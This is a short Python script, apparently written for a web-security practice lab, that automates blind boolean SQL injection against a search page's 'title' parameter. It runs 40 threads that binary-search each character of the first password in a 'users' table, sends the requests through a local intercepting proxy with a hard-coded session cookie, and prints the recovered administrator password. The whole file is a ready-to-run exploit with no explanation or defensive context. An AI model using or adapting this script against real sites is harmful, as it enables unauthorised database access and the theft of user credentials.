#!/usr/bin/python3

import sys
import requests
import urllib3
import urllib
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

threads = []
password_list = [None] * 40
Password = ""

def sqli_password(url, i, low, high):
    global password_list
    
    if low > high:
        return

    mid = (low + high) // 2
    # sqli_payload = "WO%' OR 1=1 AND SUBSTRING((SELECT password FROM users LIMIT 1), %s, 1)>'%s' # -- -" % (i, mid)
    sqli_payload = "WO%' OR 1=1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), {}, 1))>'{}' # -- - ".format(i, mid)

    params = {
    "title": sqli_payload,
    "action": "search"
    }

    encoded_params = urllib.parse.urlencode(params)
    full_url = f"{url}?{encoded_params}"

    cookies = {'PHPSESSID': '485dc6d1f49f6d1565cf2a195b0512e6', 'security_level': '0'}

    r = requests.get(full_url, verify=False, cookies=cookies, proxies=proxies)

    if "does" in r.text:
        sqli_password(url, i, low, mid - 1)
    else:
        password_list[i-1] = chr(mid + 1)
        sqli_password(url, i, mid + 1, high)


def sqli_password_thread_for_each_char(url, i):
    sqli_password(url, i, 32, 126)


def main():
    global threads
    global password_list
    global Password
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        return

    url = sys.argv[1]

    print("[+] Retrieving administrator password...")
    for i in range(1, 41):
        t = threading.Thread(target=sqli_password_thread_for_each_char, args=(url, i))
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()

    for char in password_list:
        Password += str(char)

    print("Password: " + Password)


if __name__ == "__main__":
    main()
